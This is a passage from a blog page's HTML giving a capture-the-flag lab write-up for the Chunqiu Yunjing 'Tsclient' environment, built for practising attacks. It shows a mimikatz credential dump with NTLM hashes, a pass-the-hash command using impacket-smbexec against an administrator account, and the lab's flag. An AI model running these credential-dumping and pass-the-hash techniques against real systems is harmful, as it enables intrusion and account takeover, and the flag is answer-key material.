style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="u7e6ce609" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="u892e00e7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : xiaorang.lab</span></p><p id="u2bcfec0f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : 17 21 e4 11 5b 9c 4a 70 2b 9c be 83 c3 7c b3 13 ba 9a f6 15 5e 31 81 ce ae f0 72 94 c3 39 b6 3c 31 34 46 02 34 d0 1a 76 7d bf 40 e5 85 ff 7d 41 b7 9c f3 e4 a2 43 31 a4 64 4b 78 34 08 3a f0 ba 35 c2 57 ea 9e 85 7b d9 dc 15 9c 7a df c1 e3 e9 1d 42 42 04 90 1a 25 96 86 e1 c3 8f b5 46 92 ff 57 cd 3f 40 76 25 fe de b3 f0 4e de d0 34 d6 01 2f 4d 02 50 8a cc da c3 63 7c 6d ab 88 ff 92 59 5e 48 b8 d2 99 3b cd 84 04 47 26 62 c4 99 b8 32 61 aa cf d6 63 7e d6 07 8d ed 31 d4 54 71 24 56 96 ff 7f 86 8f 1e 31 17 5b e3 30 bb 0f ca 61 ff a3 b8 cb 4e 55 9a a9 90 79 2b 6e 2e 77 79 ce f6 ed c7 1a 92 80 ca ae 92 4c 85 e7 9d 78 a4 b1 6a 43 42 34 2f fd 15 dc ac 7f 8b 9f ef 7a ab 77 2e e6 a3 be 70 f3 84 23 be 5c 80 fa 4b 27 80 c3 a5 </span></p><p id="ue2a58b98" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="u67f7269c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="u390b9ec2" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="uacfd00b7" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 25509 (00000000:000063a5)</span></p><p id="u9a46768b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : UndefinedLogonType from 0</span></p><p id="ud2610740" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : (null)</span></p><p id="u020b2d69" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : (null)</span></p><p id="u3b66540c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="u0d61ac78" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:43</span></p><p id="u7db41428" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : </span></p><p id="uacff7467" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="u67e21e68" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 [00000003] Primary</span></p><p id="u21731075" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="u7a931f61" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="uc8f0a88a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * NTLM     : 83c84a7d3f40516a50f56172f622c38e</span></p><p id="ud70206cb" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * SHA1     : ac968d62fbbac3b04a453f87d261345268fc6566</span></p><p id="ufef36316" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="u75e1ea04" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="u10c4fc1f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="u6fb51203" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="ub308e326" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="udd02d8ef" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p><p id="udd2c4f41" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Authentication Id : 0 ; 999 (00000000:000003e7)</span></p><p id="uedeb269e" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Session           : UndefinedLogonType from 0</span></p><p id="uf1dca283" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">User Name         : WIN2016$</span></p><p id="u4993ef1a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Domain            : XIAORANG</span></p><p id="u254e634c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Server      : (null)</span></p><p id="ufdbbe5d8" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Logon Time        : 2025/2/10 16:18:43</span></p><p id="ub9ac06f1" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">SID               : S-1-5-18</span></p><p id="ue7aa0304" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	msv :	</span></p><p id="u1d69f7ff" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	tspkg :	</span></p><p id="u61ebe5f9" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	wdigest :	</span></p><p id="u55ae4999" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : WIN2016$</span></p><p id="u88532a46" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG</span></p><p id="uac80b54f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : (null)</span></p><p id="u68e524b3" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	kerberos :	</span></p><p id="u38010651" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Username : win2016$</span></p><p id="ua383fb2f" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Domain   : XIAORANG.LAB</span></p><p id="ub887b856" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	 * Password : 17 21 e4 11 5b 9c 4a 70 2b 9c be 83 c3 7c b3 13 ba 9a f6 15 5e 31 81 ce ae f0 72 94 c3 39 b6 3c 31 34 46 02 34 d0 1a 76 7d bf 40 e5 85 ff 7d 41 b7 9c f3 e4 a2 43 31 a4 64 4b 78 34 08 3a f0 ba 35 c2 57 ea 9e 85 7b d9 dc 15 9c 7a df c1 e3 e9 1d 42 42 04 90 1a 25 96 86 e1 c3 8f b5 46 92 ff 57 cd 3f 40 76 25 fe de b3 f0 4e de d0 34 d6 01 2f 4d 02 50 8a cc da c3 63 7c 6d ab 88 ff 92 59 5e 48 b8 d2 99 3b cd 84 04 47 26 62 c4 99 b8 32 61 aa cf d6 63 7e d6 07 8d ed 31 d4 54 71 24 56 96 ff 7f 86 8f 1e 31 17 5b e3 30 bb 0f ca 61 ff a3 b8 cb 4e 55 9a a9 90 79 2b 6e 2e 77 79 ce f6 ed c7 1a 92 80 ca ae 92 4c 85 e7 9d 78 a4 b1 6a 43 42 34 2f fd 15 dc ac 7f 8b 9f ef 7a ab 77 2e e6 a3 be 70 f3 84 23 be 5c 80 fa 4b 27 80 c3 a5 </span></p><p id="u7a6cd2da" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	ssp :	</span></p><p id="ub086ea6a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">	credman :	</span></p><p id="u530321b4" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text"></span></p></details>
+
+<p>hash传递攻击。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell之后直接获取flag3。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141009490.png" alt="img"></p>
+<p>flag3为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;11216481-4474-44ea-9841-d252f2e7f883&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h2><p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/#flag02">https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zer0peach.github.io/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/">https://zer0peach.github.io/2024/11/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/</a></p>
+<p><a target="_blank" rel="noopener" href="https://bowuchuling.github.io/posts/chunqiu_Tsclient">https://bowuchuling.github.io/posts/chunqiu_Tsclient</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fdxsec/p/17875312.html">https://www.cnblogs.com/fdxsec/p/17875312.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Articles</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/friends/">Friends</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">4.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/11/Tsclient/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/11/Tsclient/&text=春秋云镜-Tsclient"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/11/Tsclient/&is_video=false&description=春秋云镜-Tsclient"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜-Tsclient&body=Check out this article: http://example.com/2025/02/11/Tsclient/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/11/Tsclient/&title=春秋云镜-Tsclient"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/11/Tsclient/&name=春秋云镜-Tsclient&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/11/Tsclient/&t=春秋云镜-Tsclient"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    Mash1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
